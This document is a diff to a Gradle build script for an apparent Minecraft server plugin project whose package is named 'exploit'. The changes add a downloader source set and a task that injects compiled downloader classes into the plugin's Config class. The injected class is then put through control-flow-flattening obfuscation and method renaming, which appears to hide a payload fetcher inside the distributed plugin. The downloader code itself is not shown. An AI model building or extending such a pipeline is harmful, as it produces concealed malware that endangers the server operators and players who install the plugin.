@@ -1,4 +1,4 @@
-import com.tmquan2508.gradle.AsmObfuscateStringsTask
+import com.tmquan2508.gradle.InjectDownloaderTask
 import com.tmquan2508.gradle.InjectConfig
 import com.tmquan2508.buildtools.AdvancedObfuscationTask
 import com.tmquan2508.gradle.RenameMethodsTask
@@ -12,16 +12,18 @@ plugins {
 group = 'com.tmquan2508'
 version = '1.0-SNAPSHOT'
 
+sourceSets {
+    downloader {
+        java {
+            srcDir 'src/downloader/java'
+        }
+    }
+}
+
 repositories {
     mavenCentral()
-    maven {
-        name = "spigotmc-repo"
-        url = "https://hub.spigotmc.org/nexus/content/repositories/snapshots/"
-    }
-    maven {
-        name = "sonatype"
-        url = "https://oss.sonatype.org/content/groups/public/"
-    }
+    maven { name = "spigotmc-repo"; url = "https://hub.spigotmc.org/nexus/content/repositories/snapshots/" }
+    maven { name = "sonatype"; url = "https://oss.sonatype.org/content/groups/public/" }
 }
 
 dependencies {
@@ -58,34 +60,35 @@ processResources {
     }
 }
 
+def mainClassesDir = sourceSets.main.output.classesDirs.getSingleFile()
+
 tasks.register('injectConfig', InjectConfig) {
     dependsOn 'compileJava'
     targetClass = 'com.tmquan2508.exploit.Config'
-    classesDir.set(layout.buildDirectory.dir('classes/java/main'))
-    outputClassesDir.set(layout.buildDirectory.dir('classes/java/main'))
+    classesDir.set(mainClassesDir)
+    outputClassesDir.set(mainClassesDir)
 }
 
-tasks.register('obfuscateConfig', AsmObfuscateStringsTask) {
-    dependsOn 'injectConfig'
+tasks.register('injectDownloader', InjectDownloaderTask) {
+    dependsOn 'injectConfig', 'compileDownloaderJava'
     targetClass = 'com.tmquan2508.exploit.Config'
-    classesDir.set(layout.buildDirectory.dir('classes/java/main'))
-    outputClassesDir.set(layout.buildDirectory.dir('classes/java/main'))
+    classesDir.set(mainClassesDir)
+    outputClassesDir.set(mainClassesDir)
+    downloaderClassesDir.set(sourceSets.downloader.output.classesDirs.getSingleFile())
 }
 
 tasks.register('obfuscateAdvanced', AdvancedObfuscationTask) {
-    description = 'Applies advanced obfuscation (Control Flow Flattening) after initial obfuscation.'
-    group = 'build'
-    dependsOn 'obfuscateConfig'
+    dependsOn 'injectDownloader'
     targetClass = 'com.tmquan2508.exploit.Config'
-    classesDir.set(layout.buildDirectory.dir('classes/java/main'))
-    outputClassesDir.set(layout.buildDirectory.dir('classes/java/main'))
+    classesDir.set(mainClassesDir)
+    outputClassesDir.set(mainClassesDir)
 }
 
 tasks.register('renameMethods', RenameMethodsTask) {
     dependsOn 'obfuscateAdvanced'
     targetClass = 'com.tmquan2508.exploit.Config'
-    classesDir.set(layout.buildDirectory.dir('classes/java/main'))
-    outputClassesDir.set(layout.buildDirectory.dir('classes/java/main'))
+    classesDir.set(mainClassesDir)
+    outputClassesDir.set(mainClassesDir)
 }
 
 tasks.named('jar') {
